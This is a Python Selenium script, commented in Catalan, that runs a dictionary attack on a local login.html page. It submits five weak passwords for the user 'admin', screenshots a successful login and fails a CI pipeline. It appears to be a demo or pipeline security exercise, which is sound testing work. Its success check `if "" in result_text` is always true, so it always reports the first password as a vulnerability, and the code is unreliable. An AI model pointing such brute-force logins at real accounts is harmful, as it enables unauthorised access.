from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
import sys

def main():
    print(" Iniciant atac de diccionari...")
    
    # Llista de contrasenyes febles
    passwords = ['1234', 'qwerty', 'admin', 'password123', 'letmein']
    
    # Configurar Chrome (mode visible - canvia a '--headless' per ocultar)
    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')  # Descomenta per mode invisible
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    try:
        # Inicialitzar Chrome
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
        
        # Obrir la pàgina local
        file_path = 'file:///' + os.path.abspath('login.html')
        driver.get(file_path)
        print(f" Obertura: {file_path}")
        
        time.sleep(2)  # Esperar que carregui
        
        # Provar cada contrasenya
        for pwd in passwords:
            print(f"\n Provant: '{pwd}'")
            
            # Localitzar elements
            user_field = driver.find_element(By.ID, "username")
            pass_field = driver.find_element(By.ID, "password")
            login_btn = driver.find_element(By.ID, "loginBtn")
            
            # Netejar camps
            user_field.clear()
            pass_field.clear()
            
            # Escriure credencials
            user_field.send_keys("admin")
            pass_field.send_keys(pwd)
            
            # Fer clic
            login_btn.click()
            time.sleep(1)
            
            # Comprovar resultat
            result_elem = driver.find_element(By.ID, "result")
            result_text = result_elem.text
            
            if "" in result_text or "Accés permès" in result_text:
                print(f" VULNERABILITAT TROBADA amb contrasenya: '{pwd}'")
                
                # Fer captura de pantalla
                screenshot_path = "hacked.png"
                driver.save_screenshot(screenshot_path)
                print(f" Captura guardada com: {screenshot_path}")
                
                # Tancar navegador
                driver.quit()
                
                # Sortir amb error (per fer fallar la pipeline)
                return False
        
        print("\n Atac completat. Cap vulnerabilitat trobada? (Mentida)")
        driver.quit()
        return True
        
    except Exception as e:
        print(f" Error: {e}")
        return False

if __name__ == "__main__":
    # Executar atac
    exit_code = 0 if main() else 1
    sys.exit(exit_code)
